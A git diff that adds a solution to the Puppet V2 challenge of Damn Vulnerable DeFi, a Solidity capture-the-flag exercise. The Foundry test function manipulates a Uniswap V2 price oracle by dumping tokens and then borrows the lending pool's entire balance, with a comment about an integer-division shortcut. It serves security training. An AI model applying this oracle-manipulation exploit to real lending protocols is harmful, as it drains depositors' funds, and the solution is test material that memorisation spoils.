@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -98,7 +99,25 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // Swap all our tokens to WETH
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), token.balanceOf(player));
+        uniswapV2Router.swapExactTokensForTokens(token.balanceOf(player), 0, path, player, block.timestamp * 2);
+
+        // Deposit all our existing ETH to mint WETH
+        weth.deposit{value: player.balance}();
+
+        // After flooding the pool with so many tokens, we can now abuse the oracle quotes
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(player));
+
+        // After manipulating the pool reserves, I think calculateDepositOfWETHRequired allows you to borrow 
+        // a quite small amount of wei from the pool for 0 due to int division, but simply borrowing the entire
+        // pool balance worked so I never attempted this
     }
 
     /**
